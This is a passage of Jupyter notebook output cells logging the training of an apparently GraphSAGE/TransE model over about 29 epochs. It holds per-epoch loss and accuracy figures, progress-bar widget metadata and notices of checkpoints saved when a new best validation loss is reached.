       "model_id": "7564784c04c4423ca2c315634ae85ea9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:24:28 | INFO | Epoch 0 | Train Loss: 1.5819 | Train Accuracy: 0.7332\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7603cbf1a1f545bdbc7b8a795e93a29d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:24:30 | INFO | Validation Loss: 1.0911 | Validation Accuracy: 0.7969\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_256/epoch_0_loss_1.0911_acc_0.7969\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fca8a2c4758a49599e30905d452e6e97",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:24:47 | INFO | Epoch 1 | Train Loss: 0.9143 | Train Accuracy: 0.8295\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c40cb3d474ce415997b755e9c8384cc4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:24:49 | INFO | Validation Loss: 0.8337 | Validation Accuracy: 0.8665\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_256/epoch_1_loss_0.8337_acc_0.8665\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "df9a039717604cc78e1cbce566e12653",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:25:07 | INFO | Epoch 2 | Train Loss: 0.8136 | Train Accuracy: 0.8420\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c4823ffbbbac441e8802f6a98ab53870",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:25:09 | INFO | Validation Loss: 0.7223 | Validation Accuracy: 0.8693\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_256/epoch_2_loss_0.7223_acc_0.8693\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "672dc97362b64f3a87f37dd81d44a088",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:25:27 | INFO | Epoch 3 | Train Loss: 0.7730 | Train Accuracy: 0.8454\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b98bb7b1dd404fce8e9221a39580bbd8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:25:29 | INFO | Validation Loss: 0.6817 | Validation Accuracy: 0.8743\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_256/epoch_3_loss_0.6817_acc_0.8743\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b48f1459cd5641c6b83a5013b243a46c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:25:46 | INFO | Epoch 4 | Train Loss: 0.7306 | Train Accuracy: 0.8456\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "318502fad7774aeca6e5b8a1a2b16dd8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:25:48 | INFO | Validation Loss: 0.7211 | Validation Accuracy: 0.8529\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1a3d8caa49e84e7e8c5c928d354852ce",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:26:06 | INFO | Epoch 5 | Train Loss: 0.7060 | Train Accuracy: 0.8493\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8a18aaf4dda94e89998f4045900c453e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:26:08 | INFO | Validation Loss: 0.6897 | Validation Accuracy: 0.8729\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "357bf55abdcf44a0a2d96c490c25053c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:26:26 | INFO | Epoch 6 | Train Loss: 0.6936 | Train Accuracy: 0.8510\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fb3f52864add407d8b2239a9987ba358",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:26:28 | INFO | Validation Loss: 0.6193 | Validation Accuracy: 0.8826\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_256/epoch_6_loss_0.6193_acc_0.8826\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c92e2ebf82574815a0151fb911aacd14",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:26:46 | INFO | Epoch 7 | Train Loss: 0.6846 | Train Accuracy: 0.8488\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "882b9b4e24514fd5ba35382c93b90a3e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:26:47 | INFO | Validation Loss: 0.6553 | Validation Accuracy: 0.8671\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dc5c21c27d4f4a87bafd2a2f49977c74",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:27:05 | INFO | Epoch 8 | Train Loss: 0.6738 | Train Accuracy: 0.8518\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "120ebc4a4add4ae48958d45240ed98ec",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:27:07 | INFO | Validation Loss: 0.6842 | Validation Accuracy: 0.8507\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "37c4ef83376d4ecbb0df564f0b6cd0cb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:27:25 | INFO | Epoch 9 | Train Loss: 0.6995 | Train Accuracy: 0.8419\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "68216a98ac474970bfed9cce4a842daf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:27:27 | INFO | Validation Loss: 0.6784 | Validation Accuracy: 0.8584\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2e5e7b05d521402f8dd2bc04d8eb240c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:27:45 | INFO | Epoch 10 | Train Loss: 0.6593 | Train Accuracy: 0.8523\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "73c3d7077fd04e8c9be391e4d88e7639",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:27:46 | INFO | Validation Loss: 0.7000 | Validation Accuracy: 0.8496\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "816e9d8dd5f34c5c8daa405e5cb151fd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:28:05 | INFO | Epoch 11 | Train Loss: 0.6644 | Train Accuracy: 0.8517\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f8a32bb09d8143f2981f12c1ccbb79d5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:28:07 | INFO | Validation Loss: 0.6479 | Validation Accuracy: 0.8583\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "012d582299ac4027a076c0cd406b94ca",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:28:25 | INFO | Epoch 12 | Train Loss: 0.6315 | Train Accuracy: 0.8551\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b1539866663a4719b93b9fd8b0fcda51",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:28:26 | INFO | Validation Loss: 0.7105 | Validation Accuracy: 0.8525\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ee0aead485cb4576b254a495926f65f9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:28:46 | INFO | Epoch 13 | Train Loss: 0.6439 | Train Accuracy: 0.8533\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "116adc6782dd45e3b1968832dfa15697",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:28:48 | INFO | Validation Loss: 0.6307 | Validation Accuracy: 0.8649\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1df43eaa2c3f4952a3d9509b8999a55c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:29:06 | INFO | Epoch 14 | Train Loss: 0.6518 | Train Accuracy: 0.8485\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8be7ed1675cf48ae81f224b154b95954",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:29:08 | INFO | Validation Loss: 0.6813 | Validation Accuracy: 0.8513\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e5973263c3074bb2a78dd35ec47ecd7c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:29:26 | INFO | Epoch 15 | Train Loss: 0.6484 | Train Accuracy: 0.8515\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "137dfa85fbf04b068f3642e41cf44d1d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:29:28 | INFO | Validation Loss: 0.6592 | Validation Accuracy: 0.8576\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c74f49d8d76446d89ad3c35a914ad82a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:29:46 | INFO | Epoch 16 | Train Loss: 0.6352 | Train Accuracy: 0.8551\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2b2c7c3e373443f6ad245b30bd7af284",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:29:49 | INFO | Validation Loss: 0.6609 | Validation Accuracy: 0.8456\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bf2057f0bca1405daf80697d1331145a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:30:07 | INFO | Epoch 17 | Train Loss: 0.6314 | Train Accuracy: 0.8520\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "34937e9980be47dcb5489b984291b47d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:30:09 | INFO | Validation Loss: 0.6902 | Validation Accuracy: 0.8461\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6b9c4ddbd9d849f297a801ac9ae151e6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:30:27 | INFO | Epoch 18 | Train Loss: 0.6246 | Train Accuracy: 0.8537\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "aab31c1b247147a39e088b3c19e79ffa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:30:29 | INFO | Validation Loss: 0.7076 | Validation Accuracy: 0.8495\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fa8174f30e7a44039fa093a2522b4471",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:30:47 | INFO | Epoch 19 | Train Loss: 0.6387 | Train Accuracy: 0.8549\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4cddbfb6cc8e4b84917631d98883e336",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:30:49 | INFO | Validation Loss: 0.6777 | Validation Accuracy: 0.8499\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bad1b63825704abda2bf3f54911f7c4b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:31:07 | INFO | Epoch 20 | Train Loss: 0.6554 | Train Accuracy: 0.8472\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f9e620057dc5449d852ac52f4d1dd104",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:31:09 | INFO | Validation Loss: 0.7334 | Validation Accuracy: 0.8393\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f1cc5b802cd647a08d9c4b948700961a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:31:27 | INFO | Epoch 21 | Train Loss: 0.6503 | Train Accuracy: 0.8500\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6200e62c1c284d0fb363a639e44c0e74",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:31:29 | INFO | Validation Loss: 0.6976 | Validation Accuracy: 0.8564\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "024f757c69184bfa9b13b6dc9349f9cc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:31:47 | INFO | Epoch 22 | Train Loss: 0.6446 | Train Accuracy: 0.8508\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a719ec38393e4a55886c8a5eeff40485",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:31:49 | INFO | Validation Loss: 0.7063 | Validation Accuracy: 0.8498\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4cba305c6c894c0cb91bf5664f1245ad",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:32:08 | INFO | Epoch 23 | Train Loss: 0.6266 | Train Accuracy: 0.8522\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "57ec5638e11140d796bf4abea62b8357",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:32:10 | INFO | Validation Loss: 0.6364 | Validation Accuracy: 0.8588\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4fdcdf9e85124f03a9ce984e2c4153e2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:32:28 | INFO | Epoch 24 | Train Loss: 0.6443 | Train Accuracy: 0.8497\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d2c418f3832a4249ac95592fcaaf3459",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:32:30 | INFO | Validation Loss: 0.6357 | Validation Accuracy: 0.8542\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ec33d6c0b2ba432986fcba53423698d3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:32:48 | INFO | Epoch 25 | Train Loss: 0.5974 | Train Accuracy: 0.8619\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2ba13bdbf95a4e0282ab486508c793d4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:32:50 | INFO | Validation Loss: 0.7245 | Validation Accuracy: 0.8438\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e1ac5ea0767e4fc59efbb6604dc9c125",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:33:08 | INFO | Epoch 26 | Train Loss: 0.6185 | Train Accuracy: 0.8582\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "37765fc5c1e04559b4b3c703627e9ca3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:33:10 | INFO | Validation Loss: 0.6114 | Validation Accuracy: 0.8576\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_256/epoch_26_loss_0.6114_acc_0.8576\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d4d62421b5ab489081316d1ea6186d90",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:33:29 | INFO | Epoch 27 | Train Loss: 0.6417 | Train Accuracy: 0.8505\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fd1da3cb661a4d9c965e0f0c413b3e8c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:33:31 | INFO | Validation Loss: 0.5811 | Validation Accuracy: 0.8727\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_256/epoch_27_loss_0.5811_acc_0.8727\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "849405975e204f95a63dd29e18423fc2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:33:50 | INFO | Epoch 28 | Train Loss: 0.6327 | Train Accuracy: 0.8484\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8d104c591ed24aa18aa24e35092f1710",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:33:52 | INFO | Validation Loss: 0.6808 | Validation Accuracy: 0.8511\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
